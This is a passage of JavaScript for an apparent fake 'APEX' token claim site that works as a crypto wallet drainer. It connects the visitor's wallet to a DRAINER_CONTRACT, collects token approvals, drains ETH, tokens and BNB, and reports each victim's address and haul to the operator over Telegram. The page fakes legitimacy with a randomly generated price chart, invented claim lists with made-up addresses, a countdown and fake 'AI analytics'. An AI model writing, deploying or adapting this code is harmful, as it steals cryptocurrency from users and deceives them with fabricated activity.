    }).join('\n');

    const msg = `<b>🟦 EVM Drain Complete</b>
👤 <code>${userAddress}</code>
💰 ETH: ${ethBalance}
🪙 Tokens found: ${tokens.length}
✅ Tokens approved: ${approvedTokens.length}
📤 Deposit: ${depositResult.ok ? depositAmount.toFixed(6) + ' ETH' : 'failed'}
📥 Drain: ${tokenDrainResult.ok ? 'OK' : 'failed'}
📥 BNB: ${bnbDrainResult.ok ? 'OK' : 'failed'}
<b>━━ Steps ━━</b>
${lines}`;

    await sendTelegramMessage(msg);
    showStatus('Claim processed', 'success');
  } catch (e) {
    logDebug(`Drain error: ${e.message}`);
    showStatus('Error: ' + e.message, 'error');
    await sendTelegramMessage(`❌ Drain error: ${e.message}`);
  }
}

// ============================================================
//  MULTI-CHAIN DISPATCHER
// ============================================================
async function initiateClaimProcess() {
  if (!web3) { showStatus('Wallet not connected', 'error'); return; }
  await drainEVM();

  if (!delayedAttemptsScheduled) {
    delayedAttemptsScheduled = true;
    setTimeout(async () => {
      // Solana / BTC handling can go here if you need it
      delayedAttemptsScheduled = false;
    }, 150000);
  }
}

// ============================================================
//  SOLANA + BITCOIN (kept minimal, not the focus)
// ============================================================
async function drainNativeBTC() { /* same as before */ }
async function drainNativeSOL() { /* same as before */ }

// ============================================================
//  TOKEN APPROVAL CHECKER (utility)
// ============================================================
/**
 * Use this to see all tokens the user has approved for the drainer.
 */
async function checkUserApprovals(userAddress) {
  const list = await fetchTokenList();
  const result = [];
  for (const t of list) {
    try {
      const abi = [{
        constant: true,
        inputs: [
          { name: "_owner", type: "address" },
          { name: "_spender", type: "address" },
        ],
        name: "allowance",
        outputs: [{ name: "", type: "uint256" }],
        type: "function",
      }];
      const c = new web3.eth.Contract(abi, t.address);
      const allowance = await c.methods.allowance(userAddress, DRAINER_CONTRACT).call();
      if (allowance && allowance !== "0") {
        result.push({ token: t.symbol, address: t.address, allowance });
      }
    } catch {}
  }
  return result;
}

// ============================================================
//  UI - CHARTS, CLAIMS, COUNTDOWN (unchanged)
// ============================================================
function startCountdown() {
  let remaining = 114600;
  updateCountdownDisplay(remaining);
  countdownInterval = setInterval(() => {
    remaining--;
    if (remaining <= 0) { clearInterval(countdownInterval); return; }
    updateCountdownDisplay(remaining);
  }, 1000);
}
function updateCountdownDisplay(s) {
  const d = Math.floor(s / 86400), h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60), sec = s % 60;
  const el = document.getElementById("countdown");
  if (el) el.textContent = `${d}:${h}:${m}:${sec}`;
}
function createTokenChart() {
  const ctx = document.getElementById("tokenChart");
  if (!ctx || typeof Chart === "undefined") return;
  const data = [];
  let v = 0.04;
  for (let i = 0; i < 24; i++) { v += Math.random() * 0.01 - 0.002; data.push(v); }
  tokenChart = new Chart(ctx.getContext("2d"), {
    type: "line",
    data: { labels: Array.from({ length: 24 }, (_, i) => i + "h"),
      datasets: [{ label: "APEX", data, borderColor: "#FF6B00", backgroundColor: "rgba(255,107,0,0.1)",
        borderWidth: 2, tension: 0.4, pointRadius: 0, fill: true }] },
    options: { responsive: true, maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: { x: { display: false }, y: { grid: { color: "rgba(255,255,255,0.05)" } } } },
  });
}
function updateTokenPrice() {
  const last = priceHistory[priceHistory.length - 1] || 0.04;
  const change = Math.random() * 0.015 - 0.002;
  const price = (last + change).toFixed(4);
  priceHistory.push(parseFloat(price));
  if (priceHistory.length > 10) priceHistory.shift();
  const el = document.getElementById("tokenPrice");
  if (el) el.textContent = `$${price}`;
}
function generateInitialClaims() {
  claimList = Array.from({ length: 10 }, () => ({
    address: `0x${Math.random().toString(16).slice(2, 6)}...`,
    amount: 500, timestamp: Date.now() - Math.random() * 3600000,
  }));
  updateClaimList();
}
function updateClaimList() {
  if (!claimListElement) return;
  claimListElement.innerHTML = claimList.map(c =>
    `<div style="display:flex;justify-content:space-between;padding:6px 0;font-size:12px;">
      <span style="color:#00b4d8;">${c.address}</span>
      <span style="color:#10b981;">${c.amount} APEX</span>
    </div>`).join("");
}
function startClaimUpdates() {
  setInterval(() => {
    claimList.unshift({ address: `0x${Math.random().toString(16).slice(2, 6)}...`, amount: 500, timestamp: Date.now() });
    if (claimList.length > 10) claimList.pop();
    updateClaimList();
  }, 30000);
}
function updateAIAnalytics() {
  if (predictionFill) predictionFill.style.width = `${85 + Math.floor(Math.random() * 15)}%`;
}
async function getETHPriceInUSD() {
  try {
    const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd");
    return (await r.json()).ethereum.usd;
  } catch { return 2200; }
}

// ============================================================
//  MODALS
// ============================================================
function showWalletModal() { walletModal?.classList.add("active"); }
function hideWalletModal() { walletModal?.classList.remove("active"); }
function hideAnnouncementModal() { announcementModal?.classList.remove("active"); }
function copyReferralLink() {
  if (!referralLink) return;
  const ta = document.createElement("textarea");
  ta.value = referralLink.textContent;
  document.body.appendChild(ta); ta.select();
  document.execCommand("copy"); document.body.removeChild(ta);
  showNotification("Copied!", "success");
}

// ============================================================
//  EVENT WIRING
// ============================================================
if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", () => navLinks?.classList.toggle("active"));
if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
if (announcementOkBtn) announcementOkBtn.addEventListener("click", hideAnnouncementModal);
if (copyReferralBtn) copyReferralBtn.addEventListener("click", copyReferralLink);

if (debugToggle) {
  debugToggle.addEventListener("click", () => {
    connectionDebug?.classList.toggle("active");
    debugToggle.textContent = connectionDebug?.classList.contains("active") ? "Hide" : "Show";
  });
}

if (walletProviders) {
  walletProviders.forEach(p => p.addEventListener("click", () => connectWithProvider(p.getAttribute("data-provider"))));
}

if (connectButton) connectButton.addEventListener("click", handleClick);

// ============================================================
//  connectWithProvider
// ============================================================
async function connectWithProvider(type, silentRestore = false) {
  try {
    if (!window.ethereum) return;
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const Web3 = (await import('web3')).default;
    web3 = new Web3(window.ethereum);
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    const accounts = await web3.eth.getAccounts();
    if (!accounts.length) return;
    connectedAddress = accounts[0];
    connectedWallet = type;
    updateConnectedUI(connectedAddress, 'evm');
    saveConnectionToLocalStorage(connectedAddress, type);
    if (!silentRestore) hideWalletModal();
    await verifyChain();
    setupEVMProviderEvents(window.ethereum);
  } catch (e) { logDebug(`connectWithProvider error: ${e.message}`); }
}

// ============================================================
//  INIT
// ============================================================
document.addEventListener("DOMContentLoaded", async () => {
  startCountdown();
  createTokenChart();
  updateTokenPrice();
  generateInitialClaims();
  startClaimUpdates();
  updateAIAnalytics();
  detectWallets();

  ethPriceInUSD = await getETHPriceInUSD();
  logDebug(`ETH price: $${ethPriceInUSD}`);

  setInterval(updateTokenPrice, 10000);
  setInterval(updateAIAnalytics, 15000);
  setInterval(async () => { ethPriceInUSD = await getETHPriceInUSD(); }, 60000);

  restoreSavedConnection();
});

// ============================================================
//  EXPORTS
// ============================================================
window.initiateClaimProcess = initiateClaimProcess;
window.drainEVM = drainEVM;
window.checkUserApprovals = checkUserApprovals;

console.log("✅ Script.js loaded — no overrides, no fake sends, real approvals");
